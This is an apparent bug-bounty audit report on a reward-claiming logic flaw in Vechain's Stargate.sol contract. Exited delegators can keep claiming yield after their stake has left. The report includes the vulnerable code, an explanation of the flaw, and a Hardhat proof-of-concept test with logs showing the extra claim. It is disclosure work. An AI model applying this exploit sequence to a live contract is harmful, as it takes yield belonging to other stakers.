# 60169 sc high exited delegations can continue to claim rewards due to logic fall through in claimabledelegationperiods&#x20;

**Submitted on Nov 19th 2025 at 14:03:21 UTC by @ihtishamsudo for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* **Report ID:** #60169
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Brief/Intro

The `_claimableDelegationPeriods` function in Stargate.sol fails to correctly handle cases where a delegation has exited (`endPeriod` is set) but the user attempts to claim rewards for periods subsequent to the exit. Specifically, if `nextClaimablePeriod` is greater than `endPeriod`, the logic falls through to a generic check that allows claiming up to the current validator period. This allows malicious actors to continue claiming rewards indefinitely after their delegation has ended, effectively stealing yield from other participants.

## Vulnerability Details

```solidity
// Stargate.sol:913
if (
    endPeriod != type(uint32).max &&
    endPeriod < currentValidatorPeriod &&
    endPeriod > nextClaimablePeriod // <--- Vulnerable Condition
) {
    return (nextClaimablePeriod, endPeriod);
}
```

The condition `endPeriod > nextClaimablePeriod` is intended to return the valid range for an exited delegation. However, if a user has already claimed all rewards up to `endPeriod`, `nextClaimablePeriod` becomes `endPeriod + 1`. In this state, the condition `endPeriod > nextClaimablePeriod` evaluates to `false`, causing the block to be skipped.

Instead of returning `(0, 0)` (indicating no more rewards are available), the execution falls through to the next `if` statement, which is intended for active delegations:

```solidity
// Stargate.sol:927
if (nextClaimablePeriod < currentValidatorPeriod) {
    return (nextClaimablePeriod, completedPeriods);
}
```

This block simply checks if the `nextClaimablePeriod` is in the past relative to the validator's current status. Since the validator continues to produce blocks, `currentValidatorPeriod` keeps increasing. The function incorrectly returns a valid range `(endPeriod + 1, completedPeriods)`, allowing the user to claim rewards for periods after they have already exited.

## Impact Details

An attacker can stake, delegate, request exit, and then repeatedly claim rewards for all future periods without having any VET locked in the protocol.

## References

<https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/e9c0bc9b0f24dc0c44de273181d9a99aaf2c31b0/packages/contracts/contracts/Stargate.sol#L879\\>
<https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/e9c0bc9b0f24dc0c44de273181d9a99aaf2c31b0/packages/contracts/contracts/Stargate.sol#L919>

## Proof of Concept

Include this test in `packages/contracts/test/unit/Stargate/Delegation.test.ts` and execute this with command:\
`VITE_APP_ENV=local yarn workspace @repo/contracts hardhat test --network hardhat test/unit/Stargate/Delegation.test.ts --grep "allows claiming rewards even after delegation exit \(BUG demonstration\)"`

```solidity
 it("allows claiming rewards even after delegation exit (BUG demonstration)", async () => {
        const levelSpec = await stargateNFTMock.getLevel(LEVEL_ID);

        // Add another delegator to ensure total stake > 0
        // This is necessary because if total stake is 0, rewards calculation returns 0
        // masking the vulnerability.
        const otherUser = otherAccounts[1];
        tx = await stargateContract.connect(otherUser).stake(LEVEL_ID, {
            value: levelSpec.vetAmountRequiredToStake,
        });
        await tx.wait();
        const otherTokenId = await stargateNFTMock.getCurrentTokenId();
        tx = await stargateContract.connect(otherUser).delegate(otherTokenId, validator.address);
        await tx.wait();
        log("\n🎉 Added another delegator to ensure total stake > 0");

        tx = await stargateContract.connect(user).stake(LEVEL_ID, {
            value: levelSpec.vetAmountRequiredToStake,
        });
        await tx.wait();
        const tokenId = await stargateNFTMock.getCurrentTokenId();
        log("\n🎉 Staked token with id:", tokenId);

        tx = await stargateContract.connect(user).delegate(tokenId, validator.address);
        await tx.wait();
        log("\n🎉 Delegated token to validator", validator.address);

        // Move validator to the first completed period so the delegation becomes active
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 1);
        await tx.wait();
        log("\n🎉 Set validator completed periods to 1 so the delegation is active");

        // Request exit while active so the protocol sets an end period for the delegation
        tx = await stargateContract.connect(user).requestDelegationExit(tokenId);
        await tx.wait();
        log("\n🎉 Requested delegation exit");

        // Fetch the delegation end period configured by the exit request and advance past it to finalize the exit
        const delegationAfterExitSignal = await stargateContract.getDelegationDetails(tokenId);
        const endPeriod = delegationAfterExitSignal.endPeriod;
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, endPeriod);
        await tx.wait();
        log("\n🎉 Set validator completed periods to endPeriod so the delegation is exited");

        expect(await stargateContract.getDelegationStatus(tokenId)).to.equal(
            DELEGATION_STATUS_EXITED
        );

        // First claim drains the legitimate rewards accrued before exit
        tx = await stargateContract.connect(user).claimRewards(tokenId);
        await tx.wait();
        log("\n🎉 Claimed legitimate rewards");

        const balanceBeforeExploit = await vthoTokenContract.balanceOf(user.address);

        // Advance one more period even though the delegation is already exited
        const exploitCompletedPeriods = endPeriod + 1n;
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(
            validator.address,
            exploitCompletedPeriods
        );
        await tx.wait();
        log("\n🎉 Advanced one more period (exploit period)");

        const delegationId = await stargateContract.getDelegationIdOfToken(tokenId);

        // BUG: claiming again still succeeds and pays out rewards, even though no stake remains delegated
        await expect(stargateContract.connect(user).claimRewards(tokenId))
            .to.emit(stargateContract, "DelegationRewardsClaimed")
            .withArgs(
                user.address,
                tokenId,
                delegationId,
                ethers.parseEther("0.1"),
                endPeriod + 1n,
                exploitCompletedPeriods
            );
        log("\n🎉 BUG: Claimed rewards again after exit!");

        const balanceAfterExploit = await vthoTokenContract.balanceOf(user.address);
        expect(balanceAfterExploit - balanceBeforeExploit).to.equal(ethers.parseEther("0.1"));
    });
```

## Logs

```bash
shard-u2: Stargate: Delegation

🎉 Added another delegator to ensure total stake > 0

🎉 Staked token with id: 10002n

🎉 Delegated token to validator 0x90F79bf6EB2c4f870365E785982E1f101E93b906

🎉 Set validator completed periods to 1 so the delegation is active

🎉 Requested delegation exit

🎉 Set validator completed periods to endPeriod so the delegation is exited

🎉 Claimed legitimate rewards

🎉 Advanced one more period (exploit period)

🎉 BUG: Claimed rewards again after exit!
    ✔ allows claiming rewards even after delegation exit (BUG demonstration) (80ms)


  1 passing (1s)

Done in 6.23s.
```
